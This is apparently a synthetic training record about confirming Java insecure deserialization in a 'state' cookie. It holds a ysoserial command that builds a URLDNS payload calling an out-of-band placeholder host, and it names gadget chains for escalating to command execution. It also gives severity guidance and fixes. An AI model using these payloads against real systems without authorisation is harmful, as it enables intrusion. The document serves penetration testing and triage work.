# DESER — gapfill_synthetic

- source: gapfill_synthetic
- class: deser

## Scenario

A Java app base64-decodes a `state` cookie and deserializes it with ObjectInputStream. Gadgets on classpath unknown. How do I reason about exploitability and prove it without assuming RCE?

## Analysis / Response

<think>
readObject() on attacker bytes = insecure deserialization; exploitability depends on a gadget chain in the classpath. I won't assume RCE — I confirm. Safest confirmation is URLDNS: it only triggers a DNS lookup, no code exec, non-destructive, and works without a full RCE chain, proving the sink deserializes my object. If URLDNS fires, I then test a known chain matching detected library versions. Over-rating on URLDNS alone is wrong — triagers downgrade.
</think>

**Insecure deserialization** of the `state` cookie (ObjectInputStream.readObject).

**Non-destructive confirmation (URLDNS — no code exec):**
```
java -jar ysoserial.jar URLDNS "http://OAST" | base64 -w0
```
Set as `state`; a DNS lookup for OAST at your listener confirms deserialization.

**Escalation (only after confirming a vulnerable lib):** CommonsCollections6 / CommonsBeanutils1 → `id`.

**Root cause:** deserializing untrusted bytes with a type-permissive ObjectInputStream; any classpath gadget is a sink.

**Impact:** RCE where a gadget exists; at minimum SSRF/DoS via URLDNS.

**Severity:** Critical (9.8) if RCE; cap at High (~7.5, C:H) if only URLDNS is demonstrable. State which you proved.

**Fix:** stop deserializing untrusted data — use a signed/encrypted token or fixed-schema JSON. If mandatory, set a strict ObjectInputFilter allowlist.
**Edge case:** do not claim RCE on URLDNS alone; that over-rates the finding.
